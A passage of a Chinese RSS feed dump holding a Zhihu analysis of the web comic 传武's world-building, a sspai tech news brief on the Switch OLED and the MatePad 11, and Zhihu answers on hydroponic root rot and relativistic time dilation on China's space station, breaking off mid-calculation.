data-private-watermark-src=\"\"></p>\n<p>这二百余年的舍命追求，到底是求来了神明的施舍；战争的胜利，还是到头来不过是黄粱一梦呢？期待秦舞阳这个山阴灵魂人物的结局，也期待未来有关他和二百年前的故事；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ba450150eb8856f8a4cd4523cc025223_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"983\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-ba450150eb8856f8a4cd4523cc025223\" data-watermark-src=\"v2-c58308fae03d2ad9c6242909a768a5ef\" data-private-watermark-src=\"\"></p>\n<p><b>2.樊家的王之宝库</b></p>\n<p>目前在《传武》此方世界的体系中被星云老师认真为最强的就是生死道的酆都和他的幽都之种；目前已经出现的如恶来和项羽都展现出了碾压天灾级别的战力和操作（李存孝预计也有可能加入幽都大礼包）；而如此强大的生死道其实也不一定全身酆都的个人玩具；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9bea722a6762a46bc0b5285db4e42103_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"770\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-9bea722a6762a46bc0b5285db4e42103\" data-watermark-src=\"v2-86a0030da5067124778bd695a5985509\" data-private-watermark-src=\"\"></p>\n<p>在汉代就有人想到了通过血脉存续来模仿幽都之种的方式，这就是樊之血；还有樊家掌握的绝学百兵演武；星云老师曾说过百兵演武和木吒的三十六天罡刀原理是一样的，区别是三十六天罡刀数量是固定的，而百兵演武中是有当代所有武器的投影；对一个武道强者来说，随时随地有取之不尽的武器是一种很可怕的绝学；武器本身因为长短软硬各有千秋，但是百兵演武可以使各种武器无缝配合，将武器之间CD的降到最小；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-322c97df2a3c79fc363b1b2724b21bc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"295\" data-watermark=\"watermark\" data-original-src=\"v2-322c97df2a3c79fc363b1b2724b21bc4\" data-watermark-src=\"v2-c6e9664c213853a8b9510a8af027f187\" data-private-watermark-src=\"\"></p>\n<p>不过狗血的是，根据星云老师来说，世界上的百兵演武虽然人人可以上手学习，但所用的库是固定的，这就导致理论上，两个强者不可能同时使用百兵演武；不过反过来两个百兵演武的使用者在争抢百兵演武的使用权倒也是十分有意思的设定（不知道这个设定现在还在不在）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-577fc3d168534e0e75f64a8292ea6aea_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"817\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-577fc3d168534e0e75f64a8292ea6aea\" data-watermark-src=\"v2-15ccc498348215229dfdeae5d63a005c\" data-private-watermark-src=\"\"></p>\n<p><b>3.六道轮回间的相生相克</b></p>\n<p>在传武的世界有六道：这六道就是传武世界运行的底层逻辑：生死掌道者目前官方公认最强，酆都也是此方唯一没有继承人的红尘仙；奇技掌道者 最早应该是此方的观音，之后是汉代作用（千年宗门嘛）建立上清派的李董，现在的继任者好像是李春；祸殃掌道者目前应该是那个叫花子，传说一切天灾都是起源于他，是追求乱世的道，目前只知道宁仲身上的祸根是他的手笔；鬼神掌道者目前未知  曾协助构建了大唐的山神土地体系和大晋的城隍体系，按照传说应该建立有宗门；王朝掌道者目前未知，应该在大唐建立有宗门，据说他的衍生规则是玉玺，是祸殃道的死对头，喜欢构建统一和平的王朝；万物掌道者 最早应该是和观音一起活动的驺虞后来唐代时期是可以使用特殊水镜的犭婴如三公主，现任是雁门关外的猰貐；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-81cdc5ef98ee62eab1437b72fb0d6446_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"646\" data-watermark=\"watermark\" data-original-src=\"v2-81cdc5ef98ee62eab1437b72fb0d6446\" data-watermark-src=\"v2-3d179beb6800386321d8274708e64fab\" data-private-watermark-src=\"\"></p>\n<p>这六道互相干涉，互相制约，相生相克构建了此方的《传武》世界；《传武》的世界确实是非常缤纷绚烂的，可能开始有一点生涩，但是当你接受了这些基本设定就能够很好的享受这里面的乐趣；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e65e30c08ed4b7ab95004611c70e227_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-1e65e30c08ed4b7ab95004611c70e227\" data-watermark-src=\"v2-169ae2151285dd842d8bfa5760bc0ca6\" data-private-watermark-src=\"\"></p>\n<p>另外，除了此方世界外，上界的神明其实也是以六位圣人为首的；不知道是否对应大千世界的六道；</p>\n<hr>\n<h2><b>个人感想</b></h2>\n<p>说点自己的想法：传武其实诞生在一个比较特殊的时期，网络漫画慢慢开始正规化，但是读者还没有完全适应网络漫画的阅读习惯；这应该也是早期《传武》剧情节奏问题的原因之一，不过反过来说，很幸运，看到《传武》一直连载到现在；不论从画风上的不断进化还是故事上的不断丰富，都可以看成这一个特殊历史时期的缩影，传武见证了网络漫画进入一个更好的时代；（下图为传武早期海报）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3a6a3afd84ebc745509f746f6ec880c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1195\" data-watermark=\"watermark\" data-original-src=\"v2-3a6a3afd84ebc745509f746f6ec880c4\" data-watermark-src=\"v2-3403f26c2f74711a0d19196b0cde9884\" data-private-watermark-src=\"v2-91d4f3fec6ed63e36141d65f7d99aeac\"></p>\n<p>《传武》正和他故事中的角色一样，是一部不断在成长的漫画；叙事上现在的《传武》不仅敢玩梦中梦这样复杂的套路，还非常善于把不同的场景穿插着推进；作画上《传武》的进步更是有目共睹的；希望《传武》未来也能想如今这样不断的进化成长，也希望这么一部优秀的漫画能被更多人看到；（下图为传武第二部海报）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2f87b8bce90dbe1af9f7df75dde38f55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1745\" data-watermark=\"watermark\" data-original-src=\"v2-2f87b8bce90dbe1af9f7df75dde38f55\" data-watermark-src=\"v2-98bde04621e3c746852bcac3e0ed3b51\" data-private-watermark-src=\"v2-c261ffb13200bdc31cdaf225b90ae3b7\"></p>\n<p><br></p>\n<a href=\"https://zhuanlan.zhihu.com/p/386792682\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-4a266d6d79ceb8f3e1eac1b9e445fd0a_bh.jpg\" data-image-width=\"1118\" data-image-height=\"563\" class=\"internal\">呆呆兽星君：《传武》红尘仙</a><p>感谢您的阅读~<br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">21 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/384869484?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价漫画《传武》？</a><br><a href=\"http://www.zhihu.com/question/348999269?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">日式  ACG 作品有哪些常见百试不爽的套路？</a><br>\n","link":"http://www.zhihu.com/question/397486086/answer/1982744764?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：新款 Switch 将于 10 月 8 日发售、传明年将推出 M2 芯片彩色版 MacBook Air","date":"2021-07-07 01:03:34","description":"\n<h2>新款 Switch 将于 10 月 8 日发售</h2>\n<p>7 月 6 日，Nintendo 公布 Switch OLED 版预告片，根据信息显示该设备采用了 7.0 寸 OLED 显示屏，内部存储空间从 32GB 扩展至 64GB，配备了全新设计的扬声器系统，底座新增网线接口。目前未公布芯片相关信息，售价 37980 日元。<a href=\"https://www.nintendo.com/switch/oled-model/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/article/d540b7472007126d7e914427c9c3870b\"></figure><h2>传 M2 芯片将装备在明年推出的彩色版 MacBook Air 上</h2>\n<p>iOS 开发人员 Dylandkt 其个人推特上称，M2 芯片将有望在 2022 年上半年发布，并将首先运用在即将推出的彩色版本 MacBook Air 上，而今年第四季度上市的 MacBook Pro 以及 Mac Mini 则会搭载 M1 的更新版本 M1X，其将会配备 10 核心，其中 8 核心负责高性能计算，剩下的两个则专注低功耗。<a href=\"https://appleinsider.com/articles/21/07/06/m2-chip-to-arrive-in-early-2022-in-a-colorful-macbook-air-says-leaker?utm_medium=rss\" target=\"_blank\">来源</a></p>\n<h2>搭载骁龙 865 和鸿蒙系统的华为 MatePad 11 正式发布</h2>\n<p>7 月 6 日华为正式发布了 MatePad 11 平板电脑，其外观设计和此前发布的 MatePad 10.8 类似，800 万自拍相机调整到屏幕右侧，整机重量为 485g，厚度为 7.25 mm，有蓝色、银色、灰色三种配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/article/4f4e720c1573c56eb45146f2c3654cd2\"></figure><p>硬件方面，处理器搭载了高通去年的旗舰骁龙 865，支持 Wi-Fi 6 ，屏幕采用了 2K的 LCD 面板，支持 120Hz 高刷和 DCI-P3 色域；电池容量为 7250 mAh，配备有四麦克风和哈曼卡顿调音的四声道喇叭，最高支持 1TB 的存储卡扩展，并可以搭配 4,096 级压感、2ms 时延的第二代 M-Pencel 手写笔使用，系统上搭载的是鸿蒙 2 系统，具体价格上，6GB 运存+ 64GB 存储售价 2499 元、6GB 运存+128GB 存储售价 2799 元、6GB 运存+ 256GB 存储售价为 3299 元，现已开启预售。<a href=\"https://cn.engadget.com/huawei-matepad-11-snapdragon-865-harmony-os-2-132650138.html\" target=\"_blank\">来源</a></p>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/66938\" target=\"_blank\">从选购到上手：树莓派零基础入坑指南</a></li>\n<li><a href=\"https://sspai.com/post/67564\" target=\"_blank\">从选专业开始，带你「玩」好职业规划这场大型 RPG</a></li>\n<li><a href=\"https://sspai.com/post/67569\" target=\"_blank\">一派：我在_____时会听_____</a></li>\n<li><a href=\"https://sspai.com/post/67443\" target=\"_blank\">快乐飞旅行报告 07：郑州的胡辣汤辣口不辣心</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67578"},{"title":"为什么植物土培时浇水太多会烂根，而水培了反而就不烂根？","date":"2021-07-06 23:08:02","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-7f800acc9b76bd4223d00fd2918a0e62_l.jpg?source=8673f162\"><span>鑫波和他的小鱼干，</span><span>你觉得我是鑫波？ 不，我是他的小鱼干！</span>\n<a href=\"https://www.zhihu.com/question/267264997/answer/321711483\" hidden>阅读原文</a>\n</div>\n<div>\n<p>土培条件下，淹水会使土壤通气性下降，根际氧含量降低，土壤氧化还原电位过低。土壤氧化还原电位太低，土壤有机质分解变慢养分供应能力会下降，嫌气分解产生大量有机酸会抑制根系呼吸作用。土壤长期的低氧化还原电位还会使 Fe、Mn 有效性增加造成根系毒害，硫化氢和丁酸积累也会抑制根系生长。根系长期生长受抑制，长期被毒物毒害，就会造成细胞坏死、凋亡，呈现出黑褐色的烂根症状，俗称淹水沤烂。</p>\n<p>水培条件下，营养液的成分通常简单，没有过多复杂的土壤有机物，只有必须的大量、中微量矿质营养。而且水培是要换水的！水培是要换水的！水培是要换水的！水培通常三到五天就要换一次水，不然水会臭，会有藻类和其他微生物滋长。因此，正规的水培条件下来不及积累大量的硫化氢等有害物质，水有一定的氧溶解量，通过换水可以供应植物根系需要的氧气。另外，土壤的成土母质成分并不单一，不同母质差别大，但淹水都会使土壤中的次生黏土矿物中 Fe、Mn 有效性升高甚至过量造成毒性增强，水培条件下的培养液不含镉、砷、铝等毒物，Fe、Mn、Cu、Zn 等微凉元素的含量也控制在适宜水平远不会因为环境变化造成过量或毒害。</p>\n<p>小结：水培条件下，通过换水补充了根系消耗掉的氧气，通常不会缺氧。水培体系成分简单，矿质元素含量精确受控，不会有离子毒害，不会大量积累硫化氢、有机酸等物质，所以水培不烂根。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/267264997\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737835"},{"title":"根据相对论，中国空间站三个月比地面能慢多少时间？","date":"2021-07-06 23:07:53","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-3038b351fb8b3d3aa8190e61efa11e51_l.jpg?source=8673f162\"><span>绿影无痕</span>\n<a href=\"https://www.zhihu.com/question/465743677/answer/1950592531\" hidden>阅读原文</a>\n</div>\n<div>\n<p>2021-06-22：</p>\n<p>根据爱因斯坦广义相对论场方程的史瓦西真空解：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=ds%5E%7B2%7D%3D-%281-%5Cfrac%7B2GM%7D%7Bc%5E%7B2%7Dr%7D%29c%5E%7B2%7Ddt%5E%7B2%7D%2B%281-%5Cfrac%7B2GM%7D%7Bc%5E%7B2%7Dr%7D%29%5E%7B-1%7Ddr%5E%7B2%7D%2Br%5E%7B2%7D%28d%5Ctheta%5E%7B2%7D%2Bsin%5E%7B2%7D%5Ctheta+d%5Cvarphi+%5E%7B2%7D%29\" alt=\"\"></p>\n<p>，可以近似推导出空间站与地面的时间差表达式为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta+t_%7B%E4%BF%AE%7D%3D%5Cleft%5B+%5Cfrac%7Bu_%7B%E7%A9%BA%7D%5E%7B2%7D-u_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%7B2c%5E%7B2%7D%7D%2B%5Cfrac%7BGM%7D%7Bc%5E%7B2%7D%7D%5Cleft%28+%5Cfrac%7B1%7D%7Br_%7B%E7%A9%BA%7D%7D-+%5Cfrac%7B1%7D%7BR_%7B%E8%B5%A4%7D%7D+%5Cright%29+%5Cright%5D%5CDelta%5Ctau_%7B%E7%A9%BA%7D\" alt=\"\"></p>\n<p>，</p>\n<p>取万有引力常数</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=G%3D6.67259%C3%9710%5E%7B-11%7DN%C2%B7m%C2%B2%2Fkg%C2%B2\" alt=\"\"></p>\n<p>，地球质量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=M%3D5.965%C3%9710%5E%7B24%7Dkg\" alt=\"\"></p>\n<p>，光速</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=c%3D299792458m%2Fs\" alt=\"\"></p>\n<p>，地球赤道半径</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%7BR_%7B%E8%B5%A4%7D%7D%3D6378200m\" alt=\"\"></p>\n<p>，中国空间站高度400~450km，取平均425km，则空间站到地心的距离</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%7Br_%7B%E7%A9%BA%7D%7D%3D6803200m\" alt=\"\"></p>\n<p>，地球赤道线速度</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=u_%7B%E8%B5%A4%7D%3D465m%2Fs\" alt=\"\"></p>\n<p>，空间站运行速度</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=u_%7B%E7%A9%BA%7D%3D7812m%2Fs+\" alt=\"\"></p>\n<p>，中国空间站累计时间</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta%5Ctau_%7B%E7%A9%BA%7D%3D3%E4%B8%AA%E6%9C%88%3D7754760s\" alt=\"\"></p>\n<p>（以90天计），得</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta+t_%7B%E4%BF%AE%7D%3D0.002287129s%5Capprox2.3ms+\" alt=\"\"></p>\n<p>。</p>\n<p>由</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta+t_%7B%E4%BF%AE%7D\" alt=\"\"></p>\n<p>公式可见，方括号中第一项表示的是狭义相对论效应，为正，说明狭相效应使时间流逝变慢，三个月能慢2.6ms；第二项是广义相对论效应，为负，说明广相效应使时间流逝变快，三个月能快0.34ms。综合起来为正，说明整体上空间站时间流逝变慢。</p>\n<p>另外，因为地球为椭球体，赤道相比中高纬度地区虽然线速度更大，但是因为隆起，引力势更小，在计算狭义、广义相对论效应时效果正好抵消，所以采用赤道半径和线速度不影响计算结果，对中国地区同样适用。</p>\n<p>所以，根据相对论，中国空间站三个月比地面能慢2.3ms。</p>\n<p>另外，扩展着说些内容。</p>\n<p>（1）平均下来，中国空间站每天比地面能慢25.4</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cmu+s\" alt=\"\"></p>\n<p>。别小看这点时间差异，如果不修正，那么理论上基于自身解算的定位误差每天将达到7.6km，3个月误差累计达到686km。因此相对论对时间的修正极其重要。</p>\n<p>（2）相对论修正中狭相占主要成分还是广相占主要成分，要看航天器的运行高度。结合万有引力公式和圆周运动向心力公式，简单推导可得上述二效应相当（时间流逝快慢相抵）的航天器运行半径</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r%3D%5Cfrac%7B3%7D%7B%5Cfrac%7B2%7D%7BR_%7B%E8%B5%A4%7D%7D%2B%5Cfrac%7Bu_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%7BGM%7D%7D%5Capprox9551km\" alt=\"\"></p>\n<p>，即在距离地面高度约3173km处，时间流逝速度与地面相同。当航天器运行轨道低于此高度时，时间流逝比地球慢，狭义相对论效应占主要成分；当航天器运行轨道高于此高度时，时间流逝比地球快，广义相对论效应占主要成分。运行高度在数万公里的北斗、GPS导航卫星，它们的时间流逝都比地球快。</p>\n<hr>\n<p>2021-06-27：</p>\n<p>鉴于@李平 的建议，周末抽空用Kerr解来分析一下。</p>\n<p>因为地球存在自转，有自转角动量，但基本认为整体电荷为0，因此可以用Kerr度规来分析。几何单位制下，以Boyer-Lindquist坐标写出Kerr真空解为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=ds%5E%7B2%7D%3D-%5Cleft%28+1-%5Cfrac%7B2Mr%7D%7B%5Crho%5E%7B2%7D%7D+%5Cright%29dt%5E%7B2%7D-%5Cfrac%7B4aMrsin%5E%7B2%7D%5Ctheta%7D%7B%5Crho%5E%7B2%7D%7Ddtd%5Cvarphi%2B%5Cfrac%7B%5Crho%5E%7B2%7D%7D%7B%5CDelta%7Ddr%5E%7B2%7D%2B%5Crho%5E%7B2%7Dd%5Ctheta%5E%7B2%7D%2B%5Cleft%5B+%5CDelta+%2B%5Cfrac%7B2Mr%5Cleft%28+r%5E%7B2%7D%2Ba%5E%7B2%7D+%5Cright%29%7D%7B%5Crho%5E%7B2%7D%7D+%5Cright%5Dsin%5E%7B2%7D%5Ctheta+d%5Cvarphi+%5E%7B2%7D\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Crho%5E%7B2%7D%3Dr%5E%7B2%7D%2Ba%5E%7B2%7Dcos%5E%7B2%7D%5Ctheta\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta%3Dr%5E%7B2%7D-2Mr%2Ba%5E%7B2%7D\" alt=\"\"></p>\n<p>。</p>\n<p>近似认为空间站在一定高度圆形轨道飞行，地球表面位置也同样为圆形轨道，则</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=dr%3D0\" alt=\"\"></p>\n<p>。</p>\n<p>为了便于计算，写出Kerr真空解在</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=dr%3D0\" alt=\"\"></p>\n<p>条件下的国际单位制形式：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=ds%5E%7B2%7D%3D-%5Cleft%28+1-%5Cfrac%7B2GMr%7D%7Bc%5E%7B2%7D%5Crho%5E%7B2%7D%7D+%5Cright%29c%5E%7B2%7Ddt%5E%7B2%7D-%5Cfrac%7B4aGMrsin%5E%7B2%7D%5Ctheta%7D%7Bc%5E%7B2%7D%5Crho%5E%7B2%7D%7Ddtd%5Cvarphi%2B%5Crho%5E%7B2%7Dd%5Ctheta%5E%7B2%7D%2B%5Cleft%5B+%5CDelta+%2B%5Cfrac%7B2GMr%5Cleft%28+r%5E%7B2%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7D+%5Cright%29%7D%7Bc%5E%7B2%7D%5Crho%5E%7B2%7D%7D+%5Cright%5Dsin%5E%7B2%7D%5Ctheta+d%5Cvarphi+%5E%7B2%7D\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Crho%5E%7B2%7D%3Dr%5E%7B2%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7Dcos%5E%7B2%7D%5Ctheta\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta%3Dr%5E%7B2%7D-%5Cfrac%7B2GMr%7D%7Bc%5E%7B2%7D%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7D\" alt=\"\"></p>\n<p>。</p>\n<p>当然，如果令地球单位质量角动量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=a%3D0\" alt=\"\"></p>\n<p>，则Kerr真空解退化为Schwarzschild真空解。Schwarzschild解是静态球对称解，Kerr解是稳态轴对称解。</p>\n<p>我们考虑一般情况：计算地球单位质量角动量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=a%3D%5Cfrac%7B2%7D%7B5%7D%5Comega+R_%7B%E8%B5%A4%7D%5E%7B2%7D%3D1186616202m%5E%7B2%7D%2Fs+\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Comega\" alt=\"\"></p>\n<p>为地球自转角速度；中国空间站的轨道倾角为42°~43°，取平均值</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Calpha%3D42.5%C2%B0\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Cvarphi%7D%7Bdt%7D%5Capprox\" alt=\"\"></p>\n<p>空间站横向角速度分量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Cvarphi%7D%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%3D%5Cfrac%7Bu_%7Bx%7D%7D%7Brsin%5Ctheta%7D%3D%5Cfrac%7Bu_%7B%E7%A9%BA%7D%7D%7Brsin%5Ctheta%7Dcos%5Cleft%28+%5Calpha%2B%5Ctheta-%5Cfrac%7B%5Cpi%7D%7B2%7D+%5Cright%29\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctheta%7D%7Bdt%7D%5Capprox\" alt=\"\"></p>\n<p>纵向角速度分量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7Bd%5Ctheta%7D%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D%3D%5Cfrac%7Bu_%7By%7D%7D%7Br%7D%3D%5Cfrac%7Bu_%7B%E7%A9%BA%7D%7D%7Br%7Dsin%5Cleft%28+%5Calpha%2B%5Ctheta-%5Cfrac%7B%5Cpi%7D%7B2%7D+%5Cright%29\" alt=\"\"></p>\n<p>（将坐标时t替换成地面固有时</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctau_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>，对速度的影响不到</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=10%5E%7B-9%7D\" alt=\"\"></p>\n<p>倍，不会对计算带来超出精度要求的影响。）；</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta%E3%80%81%5Cvarphi\" alt=\"\"></p>\n<p>随运行过程均发生变化，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta%5Cin%5Cleft%5B+%5Cfrac%7B%5Cpi%7D%7B2%7D-%5Calpha%2C+%5Cfrac%7B%5Cpi%7D%7B2%7D%2B%5Calpha%5Cright%5D\" alt=\"\"></p>\n<p>，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cvarphi%5Cin%5Cleft%5B+0%2C2%5Cpi+%5Cright%5D\" alt=\"\"></p>\n<p>。</p>\n<p>则固有时与坐标时比值的平方</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=-%5Cfrac%7Bd%5Ctau%5E%7B2%7D%7D%7Bdt%5E%7B2%7D%7D%3D-%5Cleft%28+1-%5Cfrac%7B2GMr%7D%7Bc%5E%7B2%7D%5Crho%5E%7B2%7D%7D+%5Cright%29-%5Cfrac%7B4aGMsin%5Ctheta%7D%7Bc%5E%7B4%7D%5Crho%5E%7B2%7D%7Du_%7Bx%7D%2B%5Cfrac%7B%5Crho%5E%7B2%7D%7D%7Bc%5E%7B2%7Dr%5E%7B2%7D%7Du_%7By%7D%5E%7B2%7D%2B%5Cfrac%7B1%7D%7Bc%5E%7B2%7Dr%5E%7B2%7D%7D%5Cleft%5B+%5CDelta+%2B%5Cfrac%7B2GMr%5Cleft%28+r%5E%7B2%7D%2B%5Cfrac%7Ba%5E%7B2%7D%7D%7Bc%5E%7B2%7D%7D+%5Cright%29%7D%7Bc%5E%7B2%7D%5Crho%5E%7B2%7D%7D+%5Cright%5Du_%7Bx%7D%5E%7B2%7D\" alt=\"\"></p>\n<p>。</p>\n<p>则空间站与地面时间差</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta+t_%7B%E4%BF%AE%7D%3D%5Cleft%28+1-%5Cfrac%7Bd%5Ctau_%7B%E7%A9%BA%7D%7D%7Bd%5Ctau_%7B%E8%B5%A4%7D%7D+%5Cright%29%5CDelta+%5Ctau_%7B%E7%A9%BA%7D\" alt=\"\"></p>\n<p>（因</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta%5Ctau_%7B%E7%A9%BA%7D%5Capprox%5CDelta%5Ctau_%7B%E8%B5%A4%7D\" alt=\"\"></p>\n<p>）。</p>\n<p>因计算过程与空间站的</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctheta\" alt=\"\"></p>\n<p>有关，所以每时每刻空间站时间流逝与地面时间流逝的比值是不断变化的。空间站在赤道与最高能到达的纬度42.5°之间时间流逝速度见下图。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-eabf218e298e1d5e7f22a446f54c4a7e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>以空间站在赤道上空的时间流逝速度为准，一天下来比地面能慢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=23.5%5Cmu+s\" alt=\"\"></p>\n<p>；以在（南）北纬42.5°上空的时间流逝速度为准，一天下来比地面能慢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=21.9%5Cmu+s\" alt=\"\"></p>\n<p>。平均下来，中国空间站一天比地面能慢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=22.5%5Cmu+s\" alt=\"\"></p>\n<p>，三个月能慢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=2.0ms\" alt=\"\"></p>\n<p>。</p>\n<hr>\n<p>2021-06-28：</p>\n<p>略去高阶小量，可以近似推导出基于Kerr真空解的空间站与地面时间差</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5CDelta+t_%7B%E4%BF%AE%7D%3D%5Cleft%5B+%5Cfrac%7Bu_%7B%E7%A9%BA%7D%5E%7B2%7D-u_%7B%E8%B5%A4%7D%5E%7B2%7D%7D%7B2c%5E%7B2%7D%7D%2B%5Cfrac%7BGM%7D%7Bc%5E%7B2%7D%7D%5Cleft%28+%5Cfrac%7B1%7D%7Br_%7B%E7%A9%BA%7D%7D-+%5Cfrac%7B1%7D%7BR_%7B%E8%B5%A4%7D%7D+%5Cright%29-%5Cfrac%7B2aGM%7D%7Bc%5E%7B4%7D%7D%5Cleft%28+%5Cfrac%7Bu_%7B%E7%A9%BA%7D%7D%7Br_%7B%E7%A9%BA%7D%5E%7B2%7D%7Dsin%5Cleft%28+%5Calpha+%2B%5Ctheta+%5Cright%29sin%5Ctheta+-%5Cfrac%7Bu_%7B%E8%B5%A4%7D%7D%7BR_%7B%E8%B5%A4%7D%5E%7B2%7D%7D+%5Cright%29+%5Cright%5D%5CDelta%5Ctau_%7B%E7%A9%BA%7D\" alt=\"\"></p>\n<p>。</p>\n<p>与施瓦西解相比，Kerr解除了有狭义相对论效应项和广义相对论效应项以外，还有第3项，为狭相、广相效应耦合项。需要指出的是，由于大量使用略去高阶小量的操作，上式关于</p>\n<p><img 